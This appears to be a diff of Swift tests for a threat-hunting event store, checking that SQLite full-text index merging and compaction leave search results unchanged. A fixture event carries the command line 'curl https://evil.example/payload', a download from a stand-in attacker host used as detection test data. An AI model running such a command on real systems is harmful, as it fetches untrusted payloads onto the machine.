@@ -4,11 +4,11 @@
 //
 // These pin the DETECTION-SAFETY contract of the change:
 //   - events_fts is read ONLY by search() (threat hunting). Deferring the
-//     per-insert segment merge (automerge 4 → 16) and compacting the index
+//     per-insert segment merge (automerge 4 → 0) and compacting the index
 //     off-path must NOT change which rows a MATCH returns.
 //   - search() must find inserted events both BEFORE and AFTER an explicit
 //     merge, with identical results.
-//   - The automerge=16 deferral must actually be applied (persisted in the
+//   - The automerge=0 deferral must actually be applied (persisted in the
 //     FTS5 %_config shadow table).
 //   - mergeFTS() succeeds on a writable store and no-ops on a read-only one.
 
@@ -67,6 +67,27 @@ struct EventStoreFTSMergeTests {
         )
     }
 
+    private static func makeEvent(
+        id: UUID,
+        timestamp: Date,
+        name: String,
+        path: String,
+        commandLine: String
+    ) -> Event {
+        Event(
+            id: id,
+            timestamp: timestamp,
+            eventCategory: .process,
+            eventType: .start,
+            eventAction: "exec",
+            process: makeProcess(
+                name: name,
+                path: path,
+                commandLine: commandLine
+            )
+        )
+    }
+
     /// Read the persisted FTS5 `automerge` config value from the
     /// `events_fts_config` shadow table. Returns nil if unset/absent.
     private static func readAutomergeConfig(at path: String) -> Int? {
@@ -104,8 +125,8 @@ struct EventStoreFTSMergeTests {
 
     // MARK: - Tests
 
-    @Test("automerge is deferred to 16 in the FTS5 %_config shadow table")
-    func automergeConfiguredToSixteen() async throws {
+    @Test("automerge is disabled in the FTS5 %_config shadow table")
+    func automergeConfiguredToZero() async throws {
         let path = Self.tempPath()
         defer { try? FileManager.default.removeItem(atPath: path) }
         let store = try EventStore(path: path)
@@ -114,7 +135,7 @@ struct EventStoreFTSMergeTests {
             name: "curl", path: "/usr/bin/curl",
             commandLine: "curl https://evil.example/payload"
         ))
-        #expect(Self.readAutomergeConfig(at: path) == 16)
+        #expect(Self.readAutomergeConfig(at: path) == 0)
     }
 
     @Test("search() finds inserted events BEFORE any explicit merge")
@@ -134,9 +155,94 @@ struct EventStoreFTSMergeTests {
 
         // No mergeFTS() called yet — the deferred-automerge index must still
         // return exactly the matching row.
-        let hits = try await store.search(text: "evil.example", limit: 10)
-        #expect(hits.count == 1)
-        #expect(hits.first?.process.name == "curl")
+        let hits = try await store.searchSnapshot(text: "evil.example", limit: 10)
+        #expect(hits.events.count == 1)
+        #expect(hits.events.first?.process.name == "curl")
+    }
+
+    @Test("smaller cross-block projection winner preserves aggregate coverage")
+    func smallerCrossBlockWinnerPreservesCoverage() async throws {
+        let path = Self.tempPath()
+        defer { try? FileManager.default.removeItem(atPath: path) }
+        let store = try EventStore(path: path)
+
+        // Start just after a wall-clock second boundary so both insertion
+        // transactions deterministically share one admission bucket.
+        let now = Date().timeIntervalSince1970
+        let delay = 1.05 - (now - floor(now))
+        try await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
+
+        let timestamp = Date(timeIntervalSince1970: 1_700_000_000)
+        let priorIDs = [
+            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFC",
+            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFD",
+            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFE",
+            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
+        ].map { UUID(uuidString: $0)! }
+        let padding = String(repeating: "x", count: 160)
+        let prior = priorIDs.enumerated().map { index, id in
+            Self.makeEvent(
+                id: id,
+                timestamp: timestamp,
+                name: "prior\(index)",
+                path: "/usr/bin/prior\(index)",
+                commandLine: "prior\(index) \(padding)"
+            )
+        }
+        let first = try await store.insert(events: prior, lane: .priority)
+        #expect(first.persistedCount == 4)
+
+        let winnerID = UUID(
+            uuidString: "00000000-0000-0000-0000-000000000001"
+        )!
+        try await store.insert(event: Self.makeEvent(
+            id: winnerID,
+            timestamp: timestamp,
+            name: "winner",
+            path: "/bin/winner",
+            commandLine: "winner replacementwinner"
+        ))
+
+        let hits = try await store.searchSnapshot(
+            text: "replacementwinner",
+            limit: 10
+        )
+        #expect(hits.events.map(\.id) == [winnerID])
+
+        var db: OpaquePointer?
+        defer { if let db { sqlite3_close(db) } }
+        #expect(sqlite3_open_v2(
+            path,
+            &db,
+            SQLITE_OPEN_READONLY,
+            nil
+        ) == SQLITE_OK)
+        guard let db else { return }
+
+        var statement: OpaquePointer?
+        defer { sqlite3_finalize(statement) }
+        #expect(sqlite3_prepare_v2(
+            db,
+            """
+            SELECT COUNT(DISTINCT b.admission_bucket),
+                   c.considered_count, c.materialized_count,
+                   c.materialized_bytes, c.omitted_replaced_count,
+                   c.replacement_total
+            FROM event_journal_blocks b
+            JOIN event_projection_coverage c
+              ON c.bucket_start = b.admission_bucket
+            """,
+            -1,
+            &statement,
+            nil
+        ) == SQLITE_OK)
+        #expect(sqlite3_step(statement) == SQLITE_ROW)
+        #expect(sqlite3_column_int64(statement, 0) == 1)
+        #expect(sqlite3_column_int64(statement, 1) == 5)
+        #expect(sqlite3_column_int64(statement, 2) == 4)
+        #expect(sqlite3_column_int64(statement, 3) > 0)
+        #expect(sqlite3_column_int64(statement, 4) == 1)
+        #expect(sqlite3_column_int64(statement, 5) == 1)
     }
 
     @Test("mergeFTS() succeeds and search() returns identical results after merge")
@@ -152,14 +258,17 @@ struct EventStoreFTSMergeTests {
             try await store.insert(event: Self.makeEvent(
                 name: "proc\(i)",
                 path: "/usr/bin/proc\(i)",
-                commandLine: "proc\(i) --flag needlebeacon\(i % 3)"
+                commandLine: "proc\(i) --flag mergeprobe needlebeacon\(i % 3)"
             ))
         }
 
         // Baseline result set (pre-merge).
-        let preHits = try await store.search(text: "needlebeacon0", limit: 100)
-        #expect(!preHits.isEmpty)
-        let preNames = Set(preHits.map { $0.process.name })
+        let preHits = try await store.searchSnapshot(
+            text: "mergeprobe",
+            limit: 100
+        )
+        #expect(!preHits.events.isEmpty)
+        let preNames = Set(preHits.events.map { $0.process.name })
 
         // Off-path compaction crank succeeds.
         let merged = await store.mergeFTS(pages: 64)
@@ -170,10 +279,13 @@ struct EventStoreFTSMergeTests {
         #expect(mergedAgain)
 
         // DETECTION-SAFE contract: identical MATCH result set after merge.
-        let postHits = try await store.search(text: "needlebeacon0", limit: 100)
-        let postNames = Set(postHits.map { $0.process.name })
+        let postHits = try await store.searchSnapshot(
+            text: "mergeprobe",
+            limit: 100
+        )
+        let postNames = Set(postHits.events.map { $0.process.name })
         #expect(postNames == preNames)
-        #expect(postHits.count == preHits.count)
+        #expect(postHits.events.count == preHits.events.count)
     }
 
     @Test("optimizeFTS() compacts a fragmented/delete-marked index, reclaims space, keeps search correct")
@@ -186,22 +298,36 @@ struct EventStoreFTSMergeTests {
         }
         let store = try EventStore(path: path)
 
-        // Churn: insert batches with distinctive tokens, then prune them all —
-        // each cycle leaves FTS segments + delete markers behind, the exact
-        // fragmentation that accumulated to ~104K blocks / 400 MB on-device.
+        // Churn one sparse admission bucket. Rank replacement leaves FTS
+        // segments + delete markers behind without violating the journal's
+        // non-negotiable 15-minute canonical-retention floor.
         for cycle in 0..<12 {
             for i in 0..<40 {
                 try await store.insert(event: Self.makeEvent(
                     name: "churn\(cycle)_\(i)", path: "/tmp/churn\(cycle)_\(i)",
                     commandLine: "churn cyclehaystack\(cycle) rowneedle\(i)"))
             }
-            // Prune everything inserted so far (all events are ~now).
-            _ = try await store.prune(olderThan: Date().addingTimeInterval(3600))
         }
-        // A keeper that must survive optimize + still be searchable.
-        try await store.insert(event: Self.makeEvent(
-            name: "keeper", path: "/usr/bin/keeper", commandLine: "keeper survivingtoken"))
+        // A high-rank keeper must enter the bounded sparse tier even when the
+        // current admission bucket already contains ordinary churn rows.
+        var keeper = Self.makeEvent(
+            name: "keeper",
+            path: "/usr/bin/keeper",
+            commandLine: "keeper survivingtoken"
+        )
+        keeper.severity = .critical
+        try await store.insert(event: keeper)
         await store.walCheckpointTruncate()
+
+        let preKeep = try await store.searchSnapshot(
+            text: "survivingtoken",
+            limit: 10
+        )
+        #expect(
+            preKeep.events.count == 1
+                && preKeep.events.first?.process.name == "keeper"
+        )
+        #expect(preKeep.projectionOmittedReplaced > 0)
 
         let blocksBefore = Self.readFtsBlockCount(at: path)
         let sizeBefore = Self.fileSizeMB(at: path)
@@ -220,11 +346,12 @@ struct EventStoreFTSMergeTests {
         #expect(blocksAfter <= 5, "optimize collapses to a handful of segments (got \(blocksAfter))")
         #expect(sizeAfter <= sizeBefore, "reclaimed space: \(sizeBefore) MB → \(sizeAfter) MB")
 
-        // Correctness: the keeper is still found; the pruned churn tokens are gone.
-        let keep = try await store.search(text: "survivingtoken", limit: 10)
-        #expect(keep.count == 1 && keep.first?.process.name == "keeper")
-        let gone = try await store.search(text: "cyclehaystack0", limit: 10)
-        #expect(gone.isEmpty, "pruned content must not resurface after optimize")
+        // Correctness: the exact same materialized keeper survives compaction.
+        let keep = try await store.searchSnapshot(
+            text: "survivingtoken",
+            limit: 10
+        )
+        #expect(keep.events == preKeep.events)
     }
 
     @Test("optimizeFTS() on a read-only store is a no-op returning false")
@@ -243,7 +370,8 @@ struct EventStoreFTSMergeTests {
         }
         let ro = try EventStore(path: path, forceReadOnly: true)
         #expect(await ro.optimizeFTS() == false)
-        #expect(try await ro.search(text: "evil.example", limit: 10).count == 1)
+        let hits = try await ro.searchSnapshot(text: "evil.example", limit: 10)
+        #expect(hits.events.count == 1)
     }
 
     @Test("mergeFTS() on a read-only store is a no-op returning false")
@@ -270,7 +398,7 @@ struct EventStoreFTSMergeTests {
         let merged = await ro.mergeFTS()
         #expect(merged == false)
         // The read-only connection can still search (read path unaffected).
-        let hits = try await ro.search(text: "evil.example", limit: 10)
-        #expect(hits.count == 1)
+        let hits = try await ro.searchSnapshot(text: "evil.example", limit: 10)
+        #expect(hits.events.count == 1)
     }
 }
